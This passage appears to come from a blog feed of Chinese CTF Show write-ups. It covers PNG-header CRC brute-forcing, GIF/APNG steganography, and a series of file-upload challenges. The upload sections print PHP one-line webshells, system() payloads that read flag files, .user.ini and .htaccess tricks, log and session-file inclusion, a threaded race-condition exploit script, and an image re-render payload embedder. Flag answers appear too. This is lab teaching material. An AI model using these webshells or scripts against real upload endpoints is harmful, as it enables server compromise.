methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150       #宽高 像素crc32 = &quot;0xe14a4c0b&quot;    #校验码for w in range(wid,wid+2000):    for h in range(hei,hei+2000):        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)        bytes_temp=hexStr2bytes(width+height)        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):            print(hex(w),hex(h))</span></span><br></pre></td></tr></table></figure><p>0x414 0x96</p><p><img src="https://i.loli.net/2021/08/18/puJBmM9NFYwl1bd.png" alt="image-20210818124125740"></p><h2 id="1-34-misc33-—-出题人丧心病狂，把高度也改了"><a href="#1-34-misc33-—-出题人丧心病狂，把高度也改了" class="headerlink" title="1.34 misc33 — 出题人丧心病狂，把高度也改了"></a>1.34 misc33 — 出题人丧心病狂，把高度也改了</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import zlibimport struct<span class="comment"># 同时爆破宽度和高度filename = &quot;misc33.png&quot;with open(filename, &#x27;rb&#x27;) as f:    all_b = f.read()    data = bytearray(all_b[12:29])    n = 4095    for w in range(n):        width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))        for h in range(n):            height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h))            for x in range(4):                data[x+4] = width[x]                data[x+8] = height[x]            crc32result = zlib.crc32(data)            #替换成图片的crc            if crc32result == 0x5255a798:                print(&quot;宽为：&quot;, end = &#x27;&#x27;)                print(width, end = &#x27; &#x27;)                print(int.from_bytes(width, byteorder=&#x27;big&#x27;))                print(&quot;高为：&quot;, end = &#x27;&#x27;)                print(height, end = &#x27; &#x27;)                print(int.from_bytes(height, byteorder=&#x27;big&#x27;))</span></span><br></pre></td></tr></table></figure><p>宽为：bytearray(b’\x00\x00\x03\xd2’) 978<br>高为：bytearray(b’\x00\x00\x00\x8e’) 142</p><h2 id="1-35-misc34-—-出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900"><a href="#1-35-misc34-—-出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900" class="headerlink" title="1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900"></a>1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900</h2><h2 id="1-36-misc35"><a href="#1-36-misc35" class="headerlink" title="1.36 misc35"></a>1.36 misc35</h2><h2 id="1-37-misc36"><a href="#1-37-misc36" class="headerlink" title="1.37 misc36"></a>1.37 misc36</h2><h2 id="1-38-misc37-—-flag在图片里"><a href="#1-38-misc37-—-flag在图片里" class="headerlink" title="1.38 misc37 — flag在图片里"></a>1.38 misc37 — flag在图片里</h2><p>StegSolve 帧图分析</p><p>ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p><p><img src="https://i.loli.net/2021/08/18/GK4Qjsxu1ombFEe.png" alt="image-20210818133303136"></p><h2 id="1-39-misc38-—-flag在图片里"><a href="#1-39-misc38-—-flag在图片里" class="headerlink" title="1.39 misc38 — flag在图片里"></a>1.39 misc38 — flag在图片里</h2><p><img src="https://i.loli.net/2021/08/18/lUidvS8bGcwmC6z.png" alt="image-20210818133639020"></p><p>使用浏览器打开，即可发现会动</p><p><img src="https://i.loli.net/2021/08/18/OmIx2Yf9HSnqTzk.png" alt="image-20210818133736905"></p><p><a href="http://www.downcc.com/soft/40902.html">APNG 图片分解器</a></p><p>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p><h2 id="1-40-misc39-—-flag就像水，忽快忽慢地流"><a href="#1-40-misc39-—-flag就像水，忽快忽慢地流" class="headerlink" title="1.40 misc39 — flag就像水，忽快忽慢地流"></a>1.40 misc39 — flag就像水，忽快忽慢地流</h2><p>这题也是一个gif，不过这里是利用<code>不同帧之间的间隔时间</code>来隐写的。</p><h2 id="1-41-misc40-—-flag就像歌，有长有短仿佛岁月悠悠"><a href="#1-41-misc40-—-flag就像歌，有长有短仿佛岁月悠悠" class="headerlink" title="1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠"></a>1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠</h2><p>apng</p><p>帧分离，换成了apng的帧时间间隔隐写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;&quot;</span><span class="keyword">for</span> i <span class="keyword">in</span> range(28,69): <span class="comment">#flag内容从28位开始    f = open(&#x27;apngframe&#x27;+str(i)+&#x27;.txt&#x27;)    s = f.read()    flag += chr(int(s.split(&quot;/&quot;)[0][6:]))print(flag)</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/PIZ4l9SsAREOBUF.png" alt="image-20210818135910351"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show Misc 入门篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-文件上传</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-10-01T11:16:29.000Z</published>
    <updated>2021-10-01T11:17:15.184Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show 文件上传篇。</p><span id="more"></span><h1 id="CTF-Show-—-文件上传"><a href="#CTF-Show-—-文件上传" class="headerlink" title="CTF Show — 文件上传"></a>CTF Show — 文件上传</h1><h2 id="1-1-Web-151-—-前端验证"><a href="#1-1-Web-151-—-前端验证" class="headerlink" title="1.1 Web 151 — 前端验证"></a>1.1 Web 151 — 前端验证</h2><p><img src="https://i.loli.net/2021/07/20/8pT6QIktcJDxwr2.png" alt="image-20210720122900336"></p><p>手动删除前端验证，好像没什么作用，尝试之后发现，只能成功上传 <code>.png</code> 图片，其实查看源代码后有</p><p><img src="https://i.loli.net/2021/07/23/rXv7nL6c8dDl91s.png" alt="image-20210723123609690"></p><p>所以只能上传 <code>.png</code> ，我们上传 <code>1.png</code> 然后抓包手动修改</p><p><img src="https://i.loli.net/2021/07/20/Cseq18PLQhN4jYt.png" alt="image-20210720123711861"></p><p>蚁剑连接即可</p><h2 id="1-2-Web-152"><a href="#1-2-Web-152" class="headerlink" title="1.2 Web 152"></a>1.2 Web 152</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后端不能单一校验</span><br></pre></td></tr></table></figure><p>同上</p><h2 id="1-3-Web-153-—-user-ini"><a href="#1-3-Web-153-—-user-ini" class="headerlink" title="1.3 Web 153 — .user.ini"></a>1.3 Web 153 — .user.ini</h2><p>由于服务器是 <code>nginx</code> ，则可尝试上传 <code>.user.ini</code></p><p><img src="https://i.loli.net/2021/10/01/OneLzrpP7mW3UDd.png" alt="image-20210720181229272"></p><p>再上传 <code>111.png</code></p><p><img src="https://i.loli.net/2021/07/20/MUD5cNCQy9KeR7F.png" alt="image-20210720181320936"></p><p>访问与 111.png 同目录下的 index.php 文件</p><p>即 <code>/upload/index.php</code> ，使用 蚁剑连接即可</p><h2 id="1-4-Web-154-—-大小写绕过-php"><a href="#1-4-Web-154-—-大小写绕过-php" class="headerlink" title="1.4 Web 154 — 大小写绕过 php"></a>1.4 Web 154 — 大小写绕过 php</h2><p>这次尝试之后发现进行了内容判断，只能使用图片木马</p><p>发现 <code>.user.ini</code> 仍旧可以上传</p><p><img src="https://i.loli.net/2021/10/01/5Ray2IkFiLb41BO.png" alt="image-20210720195220069"></p><p>但是内容过滤了 <code>php</code> ,想办法找一些不含有 php 的一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:XML风格，也是官方推荐的形式</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2:短标记</span><br><span class="line">&lt;? @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;</span><br><span class="line">需要开启配置参数short_open_tags=on</span><br><span class="line">&lt;?= @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br><span class="line">自 PHP 5.4 起，短格式的 <span class="built_in">echo</span> 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。</span><br><span class="line">&lt;? <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;?&gt; //short_open_tags=on</span><br><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php <span class="built_in">echo</span> (表达式)?&gt; //无限制</span><br><span class="line"></span><br><span class="line">3:ASP风格</span><br><span class="line">&lt;% @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]); %&gt;</span><br><span class="line">ASP风格标记仅在通过php.ini配置文件中的指令asp_tags打开后才可用。</span><br><span class="line">&lt;% <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt; //asp_tags=on php_version &lt; 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4:脚本风格</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">PHP 7.0.0以后失效</span><br></pre></td></tr></table></figure><p>本题发现可以大小写进行绕过</p><p><img src="https://i.loli.net/2021/10/01/OK2fCwJcnrYslM9.png" alt="image-20210720200023631"></p><p>蚁剑显示不出具体文件时，尝试进行终端查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，没过滤大小写</span></span><br></pre></td></tr></table></figure><h2 id="1-5-Web-155-—-短标签绕过-php"><a href="#1-5-Web-155-—-短标签绕过-php" class="headerlink" title="1.5 Web 155 — 短标签绕过 php"></a>1.5 Web 155 — 短标签绕过 php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，过滤了大小写</span></span><br></pre></td></tr></table></figure><p>同上</p><p>可使用短标签绕过 php</p><h2 id="1-6-Web-156-—-代替"><a href="#1-6-Web-156-—-代替" class="headerlink" title="1.6 Web 156 — { } 代替 [ ]"></a>1.6 Web 156 — { } 代替 [ ]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]符号</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/Nra5pRCybtQYUOP.png" alt="image-20210720202139179"></p><p><img src="https://i.loli.net/2021/10/01/wcz8kXj7r3ExJie.png" alt="image-20210720202229781"></p><p>之后同上</p><h2 id="1-7-Web-157-159-—-命令执行"><a href="#1-7-Web-157-159-—-命令执行" class="headerlink" title="1.7 Web 157-159 — 命令执行"></a>1.7 Web 157-159 — 命令执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]，&#123;&#125;，;</span></span><br></pre></td></tr></table></figure><p>转换思路，不上传一句话了，直接</p><p>命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? system(<span class="string">&quot;nl ../f*&quot;</span>)?&gt;</span><br><span class="line">&lt;?=(system(<span class="string">&#x27;nl ../f*&#x27;</span>))?&gt;</span><br><span class="line">&lt;?= `nl ../*.p*`?&gt;</span><br><span class="line">&lt;?= `nl ../f*`?&gt;</span><br><span class="line">&lt;?=(system(<span class="string">&#x27;tac ../f*&#x27;</span>))?&gt;</span><br></pre></td></tr></table></figure><h2 id="1-8-Web-160-—-日志包含（过滤-log）"><a href="#1-8-Web-160-—-日志包含（过滤-log）" class="headerlink" title="1.8 Web 160 — 日志包含（过滤 log）"></a>1.8 Web 160 — 日志包含（过滤 log）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]，;，``，log</span></span><br></pre></td></tr></table></figure><p>日志包含</p><p>条件</p><ul><li>知道日志文件的路径</li><li>对日志文件可读</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .user.iniauto_prepend_file=123.png# 上传 123.png# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;</span></span><br></pre></td></tr></table></figure><p>将 .user.ini 和 123.png 都成功上传之后，访问 <code> /upload/index.php</code></p><p>抓包在 <code>User-Agent</code> 中添入代码，访问即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../flag.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/p6PutMZCSYgQdLr.png" alt="image-20210721124504715"></p><p><img src="https://i.loli.net/2021/07/21/O9SvKMbpocfR3q2.png" alt="image-20210721124531227"></p><p>流程</p><ul><li>访问 <code>/upload/index.php</code> 由于 <code>.user.ini</code> 的配置，将首先自动包含文件 <code>123.png</code> </li><li>由于是 <code>包含</code> 文件 <code>123.png</code> ，将会自动执行其中的代码</li><li>即包含 <code>/var/log/nginx/access.log</code> 日志文件</li><li>而我们再在日志文件当中写入 恶意代码，就将会被执行</li></ul><h2 id="1-9-Web-161-—-文件头-GIF89a-写入"><a href="#1-9-Web-161-—-文件头-GIF89a-写入" class="headerlink" title="1.9 Web 161 — 文件头 GIF89a 写入"></a>1.9 Web 161 — 文件头 GIF89a 写入</h2><p>无法上传 <code>.user.ini</code></p><p>验证了图片内容，即必须包含文件头</p><p>在 Web 160 的基础上添加 文件头 <code>GIF89a</code> 或者是 PNG 图片的 <code>文件幻术</code></p><p><img src="https://i.loli.net/2021/07/21/Ya75OIkosdrSbRE.png" alt="image-20210721125558136"></p><p><img src="https://i.loli.net/2021/07/21/qGbXiNZ7uD8A2Pe.png" alt="image-20210721125856813"></p><p><img src="https://i.loli.net/2021/07/21/wOsKQkMEYRUujnW.png" alt="image-20210721130106975"></p><h2 id="1-10-Web-162-163-—-session-文件包含"><a href="#1-10-Web-162-163-—-session-文件包含" class="headerlink" title="1.10 Web 162-163 — session 文件包含"></a>1.10 Web 162-163 — session 文件包含</h2><p>继续使用上述 日志 包含，发现上传 <code>.user.ini</code> 时，文件内容 过滤掉了 <code>.</code></p><p>过滤掉了 <code>.</code>  session 包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .user.iniGIF89aauto_prepend_file=test</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;</span></span><br></pre></td></tr></table></figure><p>构造 POST 数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>任意上传一个文件，抓包修改，写入代码，进行爆破</p><p><img src="https://i.loli.net/2021/07/21/HmES6KB97UnDcgF.png" alt="image-20210721151414901"></p><p>然后访问 <code>/upload/index.php</code> 页面进行抓包，爆破</p><p><img src="https://i.loli.net/2021/07/21/uSMpcJGzZD91brq.png" alt="image-20210721151707750"></p><p>以上两个包同时进行爆破，得到 flag</p><p><img src="https://i.loli.net/2021/07/21/rKuN4IBLwt9eXkZ.png" alt="image-20210721151742123"></p><p>流程</p><ul><li><p>上传 <code>.user.ini</code></p></li><li><p>上传 <code>test</code> </p></li><li><p>访问 <code>/upload/index.php</code> ，由于 <code>.user.ini</code> 的配置，首先包含 <code>test</code> 文件，紧接着执行其中代码，即包含 <code>/tmp/sess_test</code></p></li><li><p>包含 <code>sess_test</code> ，即执行其中的 php 代码，即显示出 flag.php</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脚本# coding=utf-8import ioimport requestsimport threadingsessID = &#x27;test&#x27;url = &#x27;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&#x27;def write(session):    while event.isSet():        f = io.BytesIO(b&#x27;a&#x27; * 256 * 1)        response = session.post(            url,            cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;,            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;&#125;,            files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125;        )def read(session):    while event.isSet():        response = session.get(url + &#x27;upload/index.php&#x27;.format(sessID))        if &#x27;flag&#x27; in response.text:            print(response.text)            event.clear()        else:            print(&#x27;[*]retrying...&#x27;)if __name__ == &#x27;__main__&#x27;:    event = threading.Event()    event.set()    with requests.session() as session:        for i in range(1, 30):            threading.Thread(target=write, args=(session,)).start()        for i in range(1, 30):            threading.Thread(target=read, args=(session,)).start()</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 条件竞争# coding=utf-8import requestsimport threadingsession=requests.session()sess=&#x27;test&#x27;url1=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&quot;url2=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/upload&quot;data1=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file=&#123;&#x27;file&#x27;:&#x27;test&#x27;&#125;cookies=&#123;&#x27;PHPSESSID&#x27;: sess&#125;def write():while True:r = session.post(url1,data=data1,files=file,cookies=cookies)def read():while True:r = session.get(url2)if &#x27;flag&#x27; in r.text:print(r.text)threads = [threading.Thread(target=write),       threading.Thread(target=read)]for t in threads:t.start()</span></span><br></pre></td></tr></table></figure><h2 id="1-11-Web-164-—-png-二次渲染"><a href="#1-11-Web-164-—-png-二次渲染" class="headerlink" title="1.11 Web 164 — png 二次渲染"></a>1.11 Web 164 — png 二次渲染</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);<span class="variable">$img</span> = imagecreatetruecolor(32, 32);<span class="keyword">for</span> (<span class="variable">$y</span> = 0; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += 3) &#123;   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+1];   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+2];   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / 3), 0, <span class="variable">$color</span>);&#125;imagepng(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure><p>结果生成 <code>1.png</code> ，其中包含 <code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code></p><p><img src="https://i.loli.net/2021/07/21/SKMrgRq4snXW91T.png" alt="image-20210721160555057"></p><p>然后访问图片，执行代码后，下载图片查看</p><p><img src="https://i.loli.net/2021/07/21/lzoC5PLZSHkDWGF.png" alt="image-20210721161031568"></p><p>因为在下载的时候，看到 url 是 <code>download/?image=</code> ，可能是文件包含，所以可以执行我们的命令</p><h2 id="1-12-Web-165-—-jpg-二次渲染"><a href="#1-12-Web-165-—-jpg-二次渲染" class="headerlink" title="1.12 Web 165 — jpg 二次渲染"></a>1.12 Web 165 — jpg 二次渲染</h2><ul><li><p>首先准备一张 jpg 图片上传，成功后下载回来，使用如下脚本处理，生成一个新的图片马，再次上传</p></li><li><p>查看，即文件包含，保存到本地打开即可</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=`tac f*`?&gt;&quot;</span>;<span class="comment">//这里改代码    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;        die(&#x27;php-gd is not installed&#x27;);    &#125;    if(!isset($argv[1])) &#123;        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#x27;Incorrect SOI marker&#x27;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;                    die(&#x27;Success!&#x27;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#x27;payload_&#x27;.$argv[1]);    die(&#x27;Something\&#x27;s wrong&#x27;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#x27;&#x27;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;//使用方法 php exp.php 1.jpg<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/ScR1qu6KTMr2sVQ.png" alt="image-20210721162813731"></p><h2 id="1-13-Web-166-—-zip-文件上传"><a href="#1-13-Web-166-—-zip-文件上传" class="headerlink" title="1.13 Web 166 — zip 文件上传"></a>1.13 Web 166 — zip 文件上传</h2><p><img src="https://i.loli.net/2021/07/21/9TkxK1odzty2Nv3.png" alt="image-20210721164403808"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Content-Type: application/x-zip-compressed</span></span><br></pre></td></tr></table></figure><p>将一句话木马后缀更改为 <code>zip</code> 上传即可，查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/download.php?file=9643f09dfc5004a1dc73f4c025f084d2.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/byWHDYP5SwFzrva.png" alt="image-20210721165703094"></p><p>将代码更改即可</p><h2 id="1-14-Web-167-—-htaccess"><a href="#1-14-Web-167-—-htaccess" class="headerlink" title="1.14 Web 167 —  .htaccess"></a>1.14 Web 167 —  .htaccess</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd</span><br></pre></td></tr></table></figure><p>尝试 jpg 文件成功上传之后发现服务器是 <code>Apache </code>，再根据提示，尝试上传 <code>.htaccess</code></p><p><img src="https://i.loli.net/2021/07/21/DSlwZg8LF4zHdat.png" alt="image-20210721170008372"></p><p><img src="https://i.loli.net/2021/07/21/BcLmbKfsRQgp2j7.png" 